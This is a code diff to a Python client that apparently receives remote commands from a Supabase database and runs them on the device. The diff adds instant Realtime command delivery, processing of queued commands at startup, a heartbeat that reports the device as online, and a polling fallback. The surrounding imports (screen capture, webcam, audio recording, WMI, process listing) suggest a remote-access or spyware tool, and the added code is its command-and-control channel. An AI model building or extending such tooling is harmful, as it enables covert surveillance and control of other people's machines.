@@ -33,6 +33,8 @@ def install_deps():
 
 try:
     from supabase import create_client, Client
+    from supabase._async.client import create_client as create_async_client
+    import asyncio
     import psutil
     from PIL import ImageGrab
     import cv2
@@ -40,10 +42,17 @@ try:
     from scipy.io.wavfile import write as wav_write
     import requests
     import wmi
+    REALTIME_AVAILABLE = True
 except ImportError:
     print("Installing dependencies...")
     install_deps()
     from supabase import create_client, Client
+    try:
+        from supabase._async.client import create_client as create_async_client
+        import asyncio
+        REALTIME_AVAILABLE = True
+    except:
+        REALTIME_AVAILABLE = False
     import psutil
     from PIL import ImageGrab
     import cv2
@@ -610,8 +619,52 @@ class CommandListener:
         except Exception as e:
             logger.error(f"Error processing command: {e}")
 
+    def on_command_received(self, payload):
+        """Callback when a new command is received via Realtime"""
+        try:
+            logger.info(f"Realtime event: {payload.get('eventType')}")
+
+            if payload.get('eventType') == 'INSERT':
+                record = payload.get('new', {})
+
+                # Check if this command is for our device and pending
+                if (record.get('device_id') == self.device_id and
+                    record.get('status') == 'pending'):
+                    logger.info(f"New command received: {record.get('command')}")
+                    self.process_command(record)
+
+        except Exception as e:
+            logger.error(f"Error handling realtime event: {e}")
+
+    def heartbeat_loop(self):
+        """Background thread to update device heartbeat"""
+        while self.running:
+            try:
+                self.supabase.table('devices').update({
+                    'last_seen': datetime.utcnow().isoformat(),
+                    'is_online': True,
+                }).eq('id', self.device_id).execute()
+            except Exception as e:
+                logger.error(f"Heartbeat error: {e}")
+            time.sleep(30)  # Update every 30 seconds
+
+    def process_pending_commands(self):
+        """Process any pending commands (on startup or reconnect)"""
+        try:
+            result = self.supabase.table('commands').select('*').eq(
+                'device_id', self.device_id
+            ).eq('status', 'pending').execute()
+
+            for command in result.data:
+                self.process_command(command)
+
+            if result.data:
+                logger.info(f"Processed {len(result.data)} pending commands")
+        except Exception as e:
+            logger.error(f"Error processing pending commands: {e}")
+
     def listen(self):
-        """Main listen loop"""
+        """Main listen loop using Supabase Realtime"""
         logger.info("Starting command listener...")
 
         if not self.device_id:
@@ -619,9 +672,66 @@ class CommandListener:
             return
 
         logger.info(f"Device ID: {self.device_id}")
-        logger.info(f"Listening for commands...")
+        self.running = True
 
-        while True:
+        # Process any pending commands first
+        self.process_pending_commands()
+
+        # Start heartbeat in background thread
+        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
+        heartbeat_thread.start()
+        logger.info("Heartbeat thread started")
+
+        # Try Realtime mode first
+        if REALTIME_AVAILABLE:
+            try:
+                asyncio.run(self.listen_realtime())
+            except KeyboardInterrupt:
+                logger.info("Command listener stopped by user")
+                self.running = False
+            except Exception as e:
+                logger.error(f"Realtime failed: {e}")
+                logger.info("Falling back to polling mode...")
+                self.listen_polling()
+        else:
+            logger.info("Realtime not available, using polling mode")
+            self.listen_polling()
+
+    async def listen_realtime(self):
+        """Async Realtime listener"""
+        # Create async client
+        realtime_client = await create_async_client(SUPABASE_URL, SUPABASE_ANON_KEY)
+
+        # Subscribe to commands channel
+        channel = realtime_client.channel('commands-channel')
+
+        def handle_insert(payload):
+            """Handle INSERT event"""
+            self.on_command_received(payload)
+
+        channel.on_postgres_changes(
+            event='INSERT',
+            schema='public',
+            table='commands',
+            filter=f'device_id=eq.{self.device_id}',
+            callback=handle_insert
+        )
+
+        await channel.subscribe()
+
+        logger.info("=" * 50)
+        logger.info("REALTIME MODE - Commands execute INSTANTLY!")
+        logger.info("=" * 50)
+
+        # Keep alive
+        while self.running:
+            await asyncio.sleep(1)
+
+    def listen_polling(self):
+        """Fallback polling mode if Realtime fails"""
+        logger.info("Using polling mode (fallback)...")
+
+        while self.running:
             try:
                 # Fetch pending commands
                 result = self.supabase.table('commands').select('*').eq(
